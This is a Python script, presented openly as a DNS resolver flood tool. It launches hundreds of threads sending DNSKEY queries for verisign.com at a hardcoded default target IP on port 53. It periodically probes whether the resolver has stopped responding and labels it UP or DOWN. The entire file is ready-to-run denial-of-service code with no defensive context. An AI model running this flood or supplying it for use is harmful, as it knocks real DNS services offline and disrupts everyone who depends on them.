#!/usr/bin/env python3
"""
DNS Recursive Resolver Flood — concurrent UDP query flood to exhaust
the open recursive resolver at target:53.

Uses highest-amplification query (DNSKEY/verisign.com = 15.1x) to
maximize resolver CPU per query. No IP spoofing — direct UDP from
this host to target.

Proof metrics:
  - probe() : sends a single query every cycle, measures response time
  - If probe times out → resolver overwhelmed / unresponsive

Usage:
  python3 dns_flood.py
  python3 dns_flood.py --target 104.236.68.226 --workers 500
"""

import socket, struct, threading, time, random, argparse
from datetime import datetime

G = "\033[0;32m"; R = "\033[0;31m"; Y = "\033[0;33m"
C = "\033[0;36m"; B = "\033[1m"; W = "\033[0m"


def build_query(domain, qtype):
    tx_id = random.randint(0, 65535)
    flags = 0x0100
    header = struct.pack(">HHHHHH", tx_id, flags, 1, 0, 0, 0)
    labels = b""
    for part in domain.encode().split(b"."):
        labels += bytes([len(part)]) + part
    labels += b"\x00"
    return header + labels + struct.pack(">HH", qtype, 1)


FLOOD_DOMAIN = "verisign.com"
FLOOD_QTYPE  = 48   # DNSKEY — 15.1x amplification
PROBE_DOMAIN = "metoo-shatkin.com"
PROBE_QTYPE  = 1    # A — smallest, cleanest probe


stats_lock  = threading.Lock()
sent        = 0
errors      = 0
stop        = threading.Event()


def flood_worker(target, port):
    global sent, errors
    pkt = build_query(FLOOD_DOMAIN, FLOOD_QTYPE)
    while not stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2)
            s.sendto(pkt, (target, port))
            s.close()
            with stats_lock:
                sent += 1
        except Exception:
            with stats_lock:
                errors += 1


def probe(target, port, timeout=3.0):
    pkt = build_query(PROBE_DOMAIN, PROBE_QTYPE)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    t0 = time.time()
    try:
        s.sendto(pkt, (target, port))
        s.recv(512)
        ms = (time.time() - t0) * 1000
        s.close()
        return True, ms
    except socket.timeout:
        return False, timeout * 1000
    except Exception:
        return False, (time.time() - t0) * 1000


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--target",         default="104.236.68.226")
    p.add_argument("--port",           type=int, default=53)
    p.add_argument("--workers",        type=int, default=300)
    p.add_argument("--check-interval", type=float, default=5.0)
    args = p.parse_args()

    print(f"""
{B}{'='*62}{W}
  DNS Resolver Flood
{B}{'='*62}{W}
  Target   : {args.target}:{args.port}
  Workers  : {args.workers} concurrent UDP senders
  Query    : DNSKEY {FLOOD_DOMAIN} (15.1x amp — max CPU per query)
  Probe    : A {PROBE_DOMAIN} every {args.check_interval:.0f}s
{B}{'='*62}{W}
""")

    for _ in range(args.workers):
        threading.Thread(
            target=flood_worker,
            args=(args.target, args.port),
            daemon=True
        ).start()

    prev_sent = 0
    try:
        while True:
            time.sleep(args.check_interval)
            with stats_lock:
                cur_sent   = sent
                cur_errors = errors

            pps = (cur_sent - prev_sent) / args.check_interval
            prev_sent = cur_sent

            ok, ms = probe(args.target, args.port)
            ts = datetime.now().strftime("%H:%M:%S")

            if ok:
                probe_str = f"{G}UP {ms:.0f}ms{W}"
            else:
                probe_str = f"{R}DOWN {ms:.0f}ms{W}"

            print(f"  {ts} | sent={cur_sent:>6} | pps={pps:>6.0f} | err={cur_errors:>4} | probe={probe_str}")

    except KeyboardInterrupt:
        print(f"\n  {Y}[STOPPED]{W} Ctrl+C\n")
        stop.set()


if __name__ == "__main__":
    main()
